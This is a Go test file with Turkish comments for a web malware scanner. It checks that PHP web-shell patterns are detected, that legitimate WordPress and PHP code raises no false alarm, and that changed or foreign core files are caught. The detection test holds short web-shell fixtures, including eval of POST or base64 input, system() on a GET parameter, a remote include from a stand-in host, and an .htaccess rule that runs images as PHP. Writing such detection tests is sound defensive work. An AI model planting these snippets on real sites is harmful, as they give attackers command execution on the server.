package avmotor

import (
	"crypto/md5"
	"encoding/hex"
	"os"
	"path/filepath"
	"testing"
)

// 🔴 Bu testler motorun HEM YAKALADIĞINI hem de YANLIŞ ALARM VERMEDİĞİNİ
// ölçer. İkincisi daha önemli: yanlış pozitifin bedeli müşterinin çalışan
// sitesidir. Yalnız "yakalıyor mu" test eden bir güvenlik aracı, her dosyayı
// zararlı ilan ederek %100 başarı gösterebilir.

type sahteSaglama struct {
	tablo map[string]string
	var_  bool
}

func (s sahteSaglama) Saglamalar(string) (map[string]string, bool) {
	return s.tablo, s.var_
}

func yaz(t *testing.T, dir, ad, icerik string) string {
	t.Helper()
	yol := filepath.Join(dir, ad)
	if err := os.MkdirAll(filepath.Dir(yol), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(yol, []byte(icerik), 0o644); err != nil {
		t.Fatal(err)
	}
	return yol
}

func TestZararliYakalanir(t *testing.T) {
	m, bozuk := Yeni(TabanSet(), 0)
	if bozuk != 0 {
		t.Fatalf("taban sette %d bozuk regex var — hepsi derlenmeli", bozuk)
	}
	dir := t.TempDir()

	ornekler := []struct {
		ad       string
		dosya    string
		icerik   string
		enAzPuan int
	}{
		{"eval+base64", "a.php", `<?php eval(base64_decode($x)); ?>`, EsikKritik},
		{"eval+POST", "b.php", `<?php eval($_POST['c']); ?>`, EsikKritik},
		{"system+GET", "c.php", `<?php system($_GET['cmd']); ?>`, EsikKritik},
		{"degisken fonksiyon", "d.php", `<?php $f($_REQUEST['x']); ?>`, EsikKritik},
		{"uzak include", "e.php", `<?php include("http://kotu.example/x.txt"); ?>`, EsikKritik},
		{"uploads altinda webshell", "wp-content/uploads/2026/x.php", `<?php eval(base64_decode($_POST['c']));`, EsikKritik},
		{"cift uzanti", "resim.jpg.php", `<?php echo 1;`, EsikSupheli},
		{"webshell parmak izi", "f.php", `<?php // WSO 2.5 FilesMan`, EsikKritik},
		{"js fromCharCode", "g.js", `eval(String.fromCharCode(97,98));`, EsikKritik},
		{"htaccess handler", ".htaccess", "AddType application/x-httpd-php .jpg", EsikKritik},
	}
	for _, o := range ornekler {
		t.Run(o.ad, func(t *testing.T) {
			yol := yaz(t, dir, o.dosya, o.icerik)
			b, tespit := m.TaraDosya(yol, "", nil)
			if !tespit {
				t.Fatalf("YAKALANMADI (puan %d): %s", b.Puan, o.icerik)
			}
			if b.Puan < o.enAzPuan {
				t.Errorf("puan %d < beklenen %d (kurallar: %v)", b.Puan, o.enAzPuan, b.Kurallar)
			}
		})
	}
}

func TestMesruKodYanlisAlarmVermez(t *testing.T) {
	m, _ := Yeni(TabanSet(), 0)
	dir := t.TempDir()

	// 🔴 Bunların hepsi GERÇEK meşru kodda görülen desenler. Bir güvenlik
	// aracının değeri, bunlara dokunmamasıyla ölçülür.
	mesru := []struct{ ad, dosya, icerik string }{
		{"base64 tek basina", "a.php",
			`<?php $veri = base64_decode($gelen); echo htmlspecialchars($veri);`},
		{"system sabit komutla", "b.php",
			`<?php system('/usr/bin/convert input.png output.jpg');`},
		{"WP eklenti tipik", "c.php",
			`<?php add_action('init', function(){ $o = get_option('x'); if ($o) update_option('x', $o+1); });`},
		{"json + curl", "d.php",
			`<?php $c = curl_init($url); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); $r = json_decode(curl_exec($c), true);`},
		{"minified js", "e.js",
			`!function(e,t){"object"==typeof exports?module.exports=t():e.x=t()}(this,function(){return{a:1,b:2}});`},
		{"uploads altinda resim", "wp-content/uploads/2026/foto.jpg", "\xff\xd8\xff\xe0JFIF binary"},
		{"normal include", "f.php", `<?php require_once __DIR__ . '/vendor/autoload.php';`},
		{"eval yok, kelime var", "g.php", `<?php // bu dosya eval kullanmaz, base64_decode da yok`},
	}
	for _, o := range mesru {
		t.Run(o.ad, func(t *testing.T) {
			yol := yaz(t, dir, o.dosya, o.icerik)
			b, tespit := m.TaraDosya(yol, "", nil)
			if tespit {
				t.Errorf("YANLIS ALARM (puan %d, kurallar %v): %s", b.Puan, b.Kurallar, o.icerik)
			}
		})
	}
}

func TestWPButunluk(t *testing.T) {
	m, _ := Yeni(TabanSet(), 0)
	kok := t.TempDir()

	// 🔴 Sağlamayı ELLE YAZMA — HESAPLA. İlk sürümde md5'i tahminle yazmıştım;
	// yanlış olduğu için "değiştirilmiş dosya yakalanır" testi HER içerikte
	// geçiyordu, yani karşılaştırmayı hiç kanıtlamıyordu. Asıl kanıtlanması
	// gereken yön TEMİZ çekirdeğin işaretlenmemesidir.
	resmiIcerik := `<?php // resmi icerik`
	temiz := yaz(t, kok, "wp-includes/load.php", resmiIcerik)
	toplam := md5.Sum([]byte(resmiIcerik))
	tablo := map[string]string{"wp-includes/load.php": hex.EncodeToString(toplam[:])}

	t.Run("TEMIZ cekirdek dosyasi isaretlenmez", func(t *testing.T) {
		b, tespit := m.TaraDosya(temiz, kok, sahteSaglama{tablo, true})
		if tespit {
			t.Fatalf("temiz cekirdek dosyasi YANLIS ALARM verdi (puan %d, %v)", b.Puan, b.Kurallar)
		}
	})

	t.Run("saglama YOKSA tespit yok (olculemedi != kirli)", func(t *testing.T) {
		if _, tespit := m.TaraDosya(temiz, kok, sahteSaglama{nil, false}); tespit {
			t.Error("saglama kaynagi yokken tespit uretti — olculemeyen sey kirli sayilamaz")
		}
	})

	t.Run("cekirdekte YABANCI dosya yakalanir", func(t *testing.T) {
		yabanci := yaz(t, kok, "wp-includes/js/jquery/jquery.min.php", `<?php echo 1;`)
		b, tespit := m.TaraDosya(yabanci, kok, sahteSaglama{tablo, true})
		if !tespit {
			t.Fatal("cekirdek agacindaki yabanci dosya YAKALANMADI")
		}
		if !icerirStr(b.Kurallar, "GOSP-WP-YABANCI-DOSYA") {
			t.Errorf("beklenen kural yok: %v", b.Kurallar)
		}
	})

	t.Run("DEGISTIRILMIS cekirdek dosyasi yakalanir", func(t *testing.T) {
		bozuk := yaz(t, kok, "wp-includes/load.php", `<?php // resmi icerik + ARKA KAPI`)
		b, tespit := m.TaraDosya(bozuk, kok, sahteSaglama{tablo, true})
		if !tespit {
			t.Fatal("degistirilmis cekirdek dosyasi YAKALANMADI")
		}
		if !icerirStr(b.Kurallar, "GOSP-WP-CEKIRDEK-DEGISMIS") {
			t.Errorf("beklenen kural yok: %v", b.Kurallar)
		}
	})

	t.Run("wp-content KAPSAM DISI", func(t *testing.T) {
		eklenti := yaz(t, kok, "wp-content/plugins/x/x.php", `<?php echo 1;`)
		b, _ := m.TaraDosya(eklenti, kok, sahteSaglama{tablo, true})
		if icerirStr(b.Kurallar, "GOSP-WP-YABANCI-DOSYA") {
			t.Error("wp-content butunluk denetimine girmemeli (resmi saglamasi yok)")
		}
	})
}
